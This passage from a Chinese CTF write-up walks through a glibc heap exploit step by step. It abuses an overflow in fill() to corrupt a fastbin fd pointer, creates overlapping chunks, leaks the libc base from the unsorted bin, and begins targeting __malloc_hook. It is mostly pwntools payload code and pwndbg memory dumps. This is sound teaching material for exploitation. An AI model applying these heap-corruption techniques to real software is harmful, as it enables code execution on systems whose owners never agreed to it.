class="hljs-number">0x00007ffff7dd1b88</span><br>pwndbg&gt;<br></code></pre></td></tr></tbody></table></figure><p>程序的结构体状况如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x5fcead98730</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>    #index0<br><span class="hljs-number">0x5fcead98740</span>:<span class="hljs-number">0x0000555555757010</span><span class="hljs-number">0x0000000000000000</span><br>    #index1（chunk_flag置零）<br><span class="hljs-number">0x5fcead98750</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>                #chunk_content_size置零   #chunk_data_ptr置空     <br><span class="hljs-number">0x5fcead98760</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>     #index2（chunk_flag置零）  #chunk_data_size置零     <br><span class="hljs-number">0x5fcead98770</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000001</span><br>    #chunk_data_ptr置空  #index3<br><span class="hljs-number">0x5fcead98780</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000080</span><br>    #index4<br><span class="hljs-number">0x5fcead987a0</span>:<span class="hljs-number">0x0000555555757090</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5fcead987b0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure><h4 id="1-4-对-index0-进行-fill-操作，溢出修改-index2-和-fd-指针"><a href="#1-4-对-index0-进行-fill-操作，溢出修改-index2-和-fd-指针" class="headerlink" title="1-4 对 index0 进行 fill 操作，溢出修改 index2 和 fd 指针"></a>1-4 对 index0 进行 fill 操作，溢出修改 index2 和 fd 指针</h4><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>payload += p8(<span class="hljs-number">0x80</span>)<br>fill(<span class="hljs-number">0</span>, payload)<br></code></pre></td></tr></tbody></table></figure><p>还记得上面提到的程序漏洞吗？<br>第一次执行Allocate函数时chunk_content_size是我们指定的，但是fill的时候并没有将新的chunk_content_size写入到结构体中，并且之前alloc chunk时指定的堆块size大小没有发生改变，所以这里就出现了任意堆溢出的情形。<br>这一小段payload的目的是：通过fill index0溢出修改index2的fd指针为index4的地址，此处的payload只用修改fd的最后一个字节为0x80即可。<br>执行payload之后的内存空间如下：</p><blockquote><p>chunk2-&gt;fd已成功修改为chunk4的起始地址（这个起始地址是指向chunk header的）</p></blockquote><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/50gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>                <span class="hljs-comment">#payload从这里开始修改堆块内容</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2（fastbin）</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000555555757080</span><span class="hljs-number">0x0000000000000000</span><br>    <span class="hljs-comment">#此处的fd指针已经被修改</span><br>--------------------------------------------------------------    <br>执行payload前原来的内容为：<br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000555555757020</span><span class="hljs-number">0x0000000000000000</span><br>--------------------------------------------------------------    <br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4（fastbin）</span><br><span class="hljs-number">0x555555757090</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br>pwndbg&gt;  <br></code></pre></td></tr></tbody></table></figure><h4 id="1-5-对-index3-进行fill操作，将-index4-的大小修改为-0x21"><a href="#1-5-对-index3-进行fill操作，将-index4-的大小修改为-0x21" class="headerlink" title="1-5 对 index3 进行fill操作，将 index4 的大小修改为 0x21"></a>1-5 对 index3 进行fill操作，将 index4 的大小修改为 0x21</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#然后再通过index3去进行写入,把index4的大小改成0x21</span><br><span class="hljs-comment">#这么做是因为当申请index4这块内存的时候,他会检查大小是不是fastbin的范围内（请注意这点)</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">3</span>, payload)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2（fastbin）</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000555555757080</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index4（fastbin）</span><br>--------------------------------------------------------------    <br>执行payload前原来的内容为：<br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4（fastbin）</span><br>-------------------------------------------------------------- <br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757180</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>再次强调，在申请fastbin中内存时，会检查被释放堆块的size（大小）是否在fastbin的范围内，如果不在，程序则异常退出，这有关于fastbin的机制。结构体状况未发生改变。</p><h4 id="1-6-申请-index4"><a href="#1-6-申请-index4" class="headerlink" title="1-6 申请 index4"></a>1-6 申请 index4</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#改好index4的大小之后去申请两次，这样就把原来的fastbin中的给申请出来了</span><br>alloc(<span class="hljs-number">0x10</span>)<br>alloc(<span class="hljs-number">0x10</span>)<br><span class="hljs-comment">#申请成功之后index2就指向index4</span><br></code></pre></td></tr></tbody></table></figure><p>首先是两个malloc，前面fastbin里一开始是两个chunk，分别为index2-&gt;index1，后来我们修改index2-&gt;fd为index4的地址，fastbin里变为</p><p>index2-&gt;index4。第一个malloc会先分配index2给我们（fastbin分配原则是LIFO即后进先出），第二个malloc会将index4分配给我们。<br>看一下堆：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757000</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757020</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757040</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757060</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk<br>Addr: <span class="hljs-number">0x555555757080</span><br>Size: <span class="hljs-number">0x00</span><br><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>此时的内存：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/50gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index4</span><br><span class="hljs-number">0x555555757090</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br><span class="hljs-number">0x555555757120</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757180</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>此时的结构体状况：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x5fcead98730</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>    <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x5fcead98740</span>:<span class="hljs-number">0x0000555555757010</span><span class="hljs-number">0x0000000000000001</span><br>    <span class="hljs-comment">#index1（chunk_flag改变）</span><br><span class="hljs-number">0x5fcead98750</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757050</span><br>                <span class="hljs-comment">#chunk_content_size（改变）   #chunk_data_ptr（改变）     </span><br><span class="hljs-number">0x5fcead98760</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>     <span class="hljs-comment">#index2（chunk_flag改变）  #chunk_data_size（改变）     </span><br><span class="hljs-number">0x5fcead98770</span>:<span class="hljs-number">0x0000555555757090</span><span class="hljs-number">0x0000000000000001</span><br>    <span class="hljs-comment">#chunk_data_ptr（改变）  #index3</span><br><span class="hljs-number">0x5fcead98780</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000080</span><br>    <span class="hljs-comment">#index4</span><br><span class="hljs-number">0x5fcead987a0</span>:<span class="hljs-number">0x0000555555757090</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5fcead987b0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure><p>注意，此时我们有两个地方指向index4：<br><strong>index4的content指针</strong>（程序的正常指向）<br><strong>index2的content指针</strong> （通过执行payload中malloc之后的指向，参照上方代码框中的结构体）<br>第二个malloc得到的是index为2的chunk，这与程序中的Allocate函数有关，可以回顾一下前面的IDA代码。<br>也就是说假如我们现在要fill index2的内容，那么其实上是修改index4的内容。</p><h4 id="1-7-修改-index4-的-size-为0x91"><a href="#1-7-修改-index4-的-size-为0x91" class="headerlink" title="1-7 修改 index4 的 size 为0x91"></a>1-7 修改 index4 的 size 为0x91</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#为了让index4能够被放到unsortedbin中,要把它的大小改回来</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">3</span>, payload)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/50gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4</span><br><span class="hljs-number">0x555555757090</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br><span class="hljs-number">0x555555757120</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757180</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>程序结构体未发生变化</p><h4 id="1-8-申请新堆块-index-5"><a href="#1-8-申请新堆块-index-5" class="headerlink" title="1-8 申请新堆块 index 5"></a>1-8 申请新堆块 index 5</h4><p>目的只是为了防止 index4 释放后与 top chunk 合并</p><h4 id="1-9-free-index4-，index4-放入-unsorted-bin-中"><a href="#1-9-free-index4-，index4-放入-unsorted-bin-中" class="headerlink" title="1-9 free(index4)，index4 放入 unsorted bin 中"></a>1-9 free(index4)，index4 放入 unsorted bin 中</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#这时候free就会把index4放到unsorted中了</span><br>free(<span class="hljs-number">4</span>)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">Free chunk (unsortedbin) | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757080</span><br>Size: <span class="hljs-number">0x91</span><br>fd: <span class="hljs-number">0x00</span><br>bk: <span class="hljs-number">0x7ffff7dd1b78</span><br><br>pwndbg&gt; x/60gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4（unsortedbin）</span><br><span class="hljs-number">0x555555757090</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b78</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000090</span> <span class="hljs-comment">#index5</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571a0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020e61</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571d0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt;<br></code></pre></td></tr></tbody></table></figure><p>当unsortedbin里只有一个空闲的chunk时，该chunk的fd和bk指针均指向unsortedbin本身，这个可以参考CTF-wiki中的内容，这里先不细说。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x5fcead98730</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>    <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x5fcead98740</span>:<span class="hljs-number">0x0000555555757010</span><span class="hljs-number">0x0000000000000001</span><br>    <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x5fcead98750</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757050</span>    <br><span class="hljs-number">0x5fcead98760</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>     <span class="hljs-comment">#index2     </span><br><span class="hljs-number">0x5fcead98770</span>:<span class="hljs-number">0x0000555555757090</span><span class="hljs-number">0x0000000000000001</span><br>        <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x5fcead98780</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>    <span class="hljs-comment">#index4（此处发生了改变）#（此处发生了改变）     </span><br><span class="hljs-number">0x5fcead987a0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000001</span><br>    <span class="hljs-comment">#（此处发生了改变）   #index5</span><br><span class="hljs-number">0x5fcead987b0</span>:<span class="hljs-number">0x0000000000000080</span><span class="hljs-number">0x0000555555757120</span><br></code></pre></td></tr></tbody></table></figure><h4 id="1-10-计算libc基址"><a href="#1-10-计算libc基址" class="headerlink" title="1-10 计算libc基址"></a>1-10 计算libc基址</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">-----------------------------------------------------------------------------<br>还可以直接这样写<br>libc_base = u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))-<span class="hljs-number">0x3c4b78</span><br>-----------------------------------------------------------------------------<br>示例payload的写法：<br><span class="hljs-comment">#因为index2是指向index4的，所以直接把index2给dump一下就能拿到index4中前一部分的内容了</span><br><span class="hljs-comment">#main_arena与libc偏移为0x3c4b20(附件中有工具)</span><br><span class="hljs-comment">#再加上main_arena与unsortedbin的偏移,得到unsortedbins与libc的偏移</span><br>unsorted_offset_mainarena=unsorted_offset_arena(<span class="hljs-number">5</span>)<span class="hljs-comment">#这函数还不太明白</span><br>unsorted_addr=u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))<br>libc_base=unsorted_addr-<span class="hljs-number">0x3c4b20</span>-unsorted_offset_mainarena<br>log.info(<span class="hljs-string">"libc_base: "</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unsorted_offset_arena</span>(<span class="hljs-params">idx</span>):<br>    word_bytes = context.word_size / <span class="hljs-number">8</span><br>    offset = <span class="hljs-number">4</span>  <span class="hljs-comment"># lock</span><br>    offset += <span class="hljs-number">4</span>  <span class="hljs-comment"># flags</span><br>    offset += word_bytes * <span class="hljs-number">10</span>  <span class="hljs-comment"># offset fastbin</span><br>    offset += word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># top,last_remainder</span><br>    offset += idx * <span class="hljs-number">2</span> * word_bytes  <span class="hljs-comment"># idx</span><br>    offset -= word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># bin overlap</span><br>    <span class="hljs-keyword">return</span> offset<br>-----------------------------------------------------------------------------<br></code></pre></td></tr></tbody></table></figure><h3 id="2-控制-malloc-hook"><a href="#2-控制-malloc-hook" class="headerlink" title="2. 控制_malloc_hook"></a>2. 控制_malloc_hook</h3><h4 id="2-1-申请-unsorted-bin-中的-chunk"><a href="#2-1-申请-unsorted-bin-中的-chunk" class="headerlink" title="2-1 申请 unsorted bin 中的 chunk"></a>2-1 申请 unsorted bin 中的 chunk</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">alloc(<span class="hljs-number">0x60</span>)<br></code></pre></td></tr></tbody></table></figure><p>由于在申请空间之前，之后unsortedbin中有空闲的空间，因此申请空间之后会使用unsortedbin中的chunk。<br>看一下此时的堆内存：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/60gx <span 